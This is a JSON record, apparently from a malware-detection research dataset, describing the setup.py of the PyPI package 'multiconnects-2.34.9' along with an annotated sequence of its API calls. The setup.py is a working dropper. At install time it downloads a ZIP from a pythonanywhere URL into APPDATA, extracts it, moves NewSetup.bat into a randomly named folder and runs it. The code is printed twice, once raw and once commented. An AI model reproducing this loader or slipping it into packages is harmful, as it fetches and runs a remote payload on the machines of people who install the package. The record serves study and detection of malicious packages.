[
  {
    "pyfile": "setup.py",
    "code_snippet": "import urllib.request\nimport zipfile\nimport os\nimport sys\nimport shutil\nimport subprocess\nimport time\nimport random\nimport string\nt = \"https://frvezdffvvvv.pythonanywhere.com/getpip\"\n\npath,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+\"\\\\5_3.zip\")\nwith zipfile.ZipFile(path, 'r') as zip_ref:\n    zip_ref.extractall(os.getenv('APPDATA'))\ntime.sleep(1)\n\nrandom.seed(10)\nletters = string.ascii_lowercase\nrand_letters = random.choices(letters,k=8)\n\ntry:\n    os.mkdir(os.getenv('APPDATA')+f\"\\\\TMP{rand_letters}\")\nexcept:\n    pass\n\nTMP_PATH = os.getenv('APPDATA')+f\"\\\\TMP{rand_letters}\"\n\nshutil.move(os.getenv('APPDATA')+\"\\\\NewSetup.bat\", TMP_PATH+\"\\\\NewSetup.bat\")\n\nsubprocess.Popen(TMP_PATH+\"\\\\NewSetup.bat\")\n\ntime.sleep(10)",
    "pattern_analysis": {
      "api_sequence": [
        "urllib.request.urlretrieve",
        "os.getenv",
        "zipfile.ZipFile",
        "zipfile.ZipFile.extractall",
        "os.getenv",
        "time.sleep",
        "random.seed",
        "random.choices",
        "os.getenv",
        "os.mkdir",
        "os.getenv",
        "os.getenv",
        "shutil.move",
        "subprocess.Popen",
        "time.sleep"
      ],
      "api_sequence_with_args": [
        "urllib.request.urlretrieve(t, os.getenv('APPDATA')+\"\\5_3.zip\")",
        "os.getenv('APPDATA')",
        "zipfile.ZipFile(path, 'r')",
        "zipfile.ZipFile.extractall(os.getenv('APPDATA'))",
        "os.getenv('APPDATA')",
        "time.sleep(1)",
        "random.seed(10)",
        "random.choices(letters, k=8)",
        "os.getenv('APPDATA')",
        "os.mkdir(os.getenv('APPDATA')+f\"\\TMP{rand_letters}\")",
        "os.getenv('APPDATA')",
        "os.getenv('APPDATA')",
        "shutil.move(os.getenv('APPDATA')+\"\\NewSetup.bat\", TMP_PATH+\"\\NewSetup.bat\")",
        "subprocess.Popen(TMP_PATH+\"\\NewSetup.bat\")",
        "time.sleep(10)"
      ],
      "mapped_sequence": [
        {
          "api_name": "urllib.request.urlretrieve",
          "id": "download_file_url",
          "description": "Downloads file from URL to specified local path",
          "first_id": "network_file_transfer",
          "second_id": "file_download",
          "third_id": "url_file_acquisition"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "open_zip_read",
          "description": "Opens ZIP archive for reading",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipfile.ZipFile.extractall",
          "id": "extract_zip_files",
          "description": "Extracts all files from ZIP archive to specified directory",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "random.seed",
          "id": "N/A",
          "description": "N/A",
          "first_id": "",
          "second_id": "",
          "third_id": ""
        },
        {
          "api_name": "random.choices",
          "id": "N/A",
          "description": "N/A",
          "first_id": "",
          "second_id": "",
          "third_id": ""
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.mkdir",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "shutil.move",
          "id": "move_file",
          "description": "Moves file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        }
      ],
      "contextual_code": "import urllib.request\nimport zipfile\nimport os\nimport shutil\nimport subprocess\nimport time\nimport random\nimport string\n\nt = \"https://frvezdffvvvv.pythonanywhere.com/getpip\"\n\n# Download ZIP file to APPDATA\npath,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+\"\\5_3.zip\")\n\n# Extract ZIP file to APPDATA\ndef extract_zip():\n    with zipfile.ZipFile(path, 'r') as zip_ref:\n        zip_ref.extractall(os.getenv('APPDATA'))\nextract_zip()\n\ntime.sleep(1)\n\nrandom.seed(10)\nletters = string.ascii_lowercase\nrand_letters = random.choices(letters,k=8)\n\n# Create TMP directory in APPDATA\ntry:\n    os.mkdir(os.getenv('APPDATA')+f\"\\TMP{rand_letters}\")\nexcept:\n    pass\n\nTMP_PATH = os.getenv('APPDATA')+f\"\\TMP{rand_letters}\"\n\n# Move batch file to TMP directory\nshutil.move(os.getenv('APPDATA')+\"\\NewSetup.bat\", TMP_PATH+\"\\NewSetup.bat\")\n\n# Execute the batch file\nsubprocess.Popen(TMP_PATH+\"\\NewSetup.bat\")\n\ntime.sleep(10)"
    }
  },
  {
    "metadata": {
      "package_name": "multiconnects-2.34.9",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/multiconnects-2.34.9/multiconnects-2.34.9/setup.py",
      "code_hash": "c251586aaa8cdfde32383cb614a574f4"
    }
  }
]